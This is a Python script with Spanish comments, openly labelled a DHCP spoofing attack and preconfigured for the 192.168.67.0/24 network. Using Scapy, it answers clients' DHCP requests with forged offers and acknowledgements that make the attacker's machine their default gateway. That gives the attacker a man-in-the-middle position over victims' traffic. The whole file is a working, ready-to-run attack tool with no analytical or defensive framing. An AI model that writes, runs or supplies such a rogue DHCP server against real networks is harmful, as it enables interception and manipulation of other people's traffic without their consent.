#!/usr/bin/env python3
"""
ATAQUE DHCP SPOOFING - Configurado para red 192.168.67.0/24
Atacante: 192.168.67.50 (actúa como gateway falso)
Pool falso: 192.168.67.200 - 192.168.67.250
"""

import argparse
import ipaddress
import os
import random
import sys
import time
from threading import Lock

try:
    from scapy.all import (
        Ether, IP, UDP, BOOTP, DHCP,
        sendp, sniff, conf, get_if_hwaddr
    )
except ImportError:
    print("[!] Instalar Scapy: pip install scapy")
    sys.exit(1)

class IPPool:
    def __init__(self, start_ip: str, end_ip: str):
        start = int(ipaddress.ip_address(start_ip))
        end = int(ipaddress.ip_address(end_ip))
        self.available = list(range(start, end + 1))
        self.leases = {}
        self.lock = Lock()

    def get_or_assign(self, mac: str) -> str | None:
        with self.lock:
            if mac in self.leases:
                return str(ipaddress.ip_address(self.leases[mac]))
            if not self.available:
                return None
            ip_int = self.available.pop(0)
            self.leases[mac] = ip_int
            return str(ipaddress.ip_address(ip_int))

    def release(self, mac: str) -> None:
        with self.lock:
            if mac in self.leases:
                self.available.insert(0, self.leases.pop(mac))

def build_dhcp_offer(xid: int, client_mac: str, offered_ip: str, server_ip: str,
                     gateway_ip: str, dns_ip: str, subnet: str, lease_time: int) -> bytes:
    return (
        Ether(src=get_if_hwaddr(conf.iface), dst=client_mac) /
        IP(src=server_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, xid=xid, yiaddr=offered_ip, siaddr=server_ip,
              chaddr=bytes.fromhex(client_mac.replace(':', ''))) /
        DHCP(options=[
            ('message-type', 'offer'), ('server_id', server_ip),
            ('lease_time', lease_time), ('subnet_mask', subnet),
            ('router', gateway_ip), ('name_server', dns_ip),
            ('renewal_time', lease_time // 2), ('rebinding_time', int(lease_time * 0.875)), 'end'
        ])
    )

def build_dhcp_ack(xid: int, client_mac: str, offered_ip: str, server_ip: str,
                   gateway_ip: str, dns_ip: str, subnet: str, lease_time: int) -> bytes:
    return (
        Ether(src=get_if_hwaddr(conf.iface), dst=client_mac) /
        IP(src=server_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, xid=xid, yiaddr=offered_ip, siaddr=server_ip,
              chaddr=bytes.fromhex(client_mac.replace(':', ''))) /
        DHCP(options=[
            ('message-type', 'ack'), ('server_id', server_ip),
            ('lease_time', lease_time), ('subnet_mask', subnet),
            ('router', gateway_ip), ('name_server', dns_ip), 'end'
        ])
    )

class DHCPSpoofServer:
    def __init__(self, iface, pool, server_ip, gateway_ip, dns_ip, subnet, lease_time):
        self.iface = iface
        self.pool = pool
        self.server_ip = server_ip
        self.gateway_ip = gateway_ip
        self.dns_ip = dns_ip
        self.subnet = subnet
        self.lease_time = lease_time
        self.offers = 0
        self.acks = 0
        conf.verb = 0

    def handle(self, pkt) -> None:
        if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
            return
        dhcp_opts = {opt[0]: opt[1] for opt in pkt[DHCP].options if isinstance(opt, tuple)}
        msg_type = dhcp_opts.get('message-type')
        client_mac = pkt[Ether].src
        xid = pkt[BOOTP].xid

        if msg_type == 1:  # Discover
            offered_ip = self.pool.get_or_assign(client_mac)
            if not offered_ip:
                print("\n[!] Pool agotado")
                return
            offer = build_dhcp_offer(xid, client_mac, offered_ip, self.server_ip,
                                     self.gateway_ip, self.dns_ip, self.subnet, self.lease_time)
            sendp(offer, iface=self.iface, verbose=0)
            self.offers += 1
            print(f"\n[+] OFFER → {client_mac} : {offered_ip} (GW: {self.gateway_ip})")

        elif msg_type == 3:  # Request
            requested_ip = dhcp_opts.get('requested_addr') or self.pool.get_or_assign(client_mac)
            if not requested_ip:
                return
            ack = build_dhcp_ack(xid, client_mac, str(requested_ip), self.server_ip,
                                 self.gateway_ip, self.dns_ip, self.subnet, self.lease_time)
            sendp(ack, iface=self.iface, verbose=0)
            self.acks += 1
            print(f"\n[+] ACK → {client_mac} : {requested_ip}")

        elif msg_type == 7:  # Release
            self.pool.release(client_mac)
            print(f"\n[*] RELEASE de {client_mac}")

    def run(self) -> None:
        print(f"""
╔══════════════════════════════════════════╗
║      DHCP Spoof Server — Activo          ║
╠══════════════════════════════════════════╣
║  Atacante IP: 192.168.67.50              ║
║  Gateway falso: {self.gateway_ip:<27} ║
║  Pool falso: 192.168.67.200-250          ║
╚══════════════════════════════════════════╝
[!] Escuchando DHCP... (Ctrl+C para salir)
""")
        sniff(iface=self.iface, filter="udp and (port 67 or port 68)", prn=self.handle, store=False)

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Ejecutar como root")
        sys.exit(1)
    
    # CONFIGURACIÓN PREDETERMINADA PARA TU RED
    IFACE = "eth0"
    SERVER_IP = "192.168.67.50"      # IP del atacante
    GATEWAY_IP = "192.168.67.50"     # El atacante como gateway falso
    DNS_IP = "8.8.8.8"
    SUBNET = "255.255.255.0"
    LEASE_TIME = 60
    POOL_START = "192.168.67.200"
    POOL_END = "192.168.67.250"
    
    pool = IPPool(POOL_START, POOL_END)
    server = DHCPSpoofServer(IFACE, pool, SERVER_IP, GATEWAY_IP, DNS_IP, SUBNET, LEASE_TIME)
    try:
        server.run()
    except KeyboardInterrupt:
        print("\n[*] Servidor detenido")
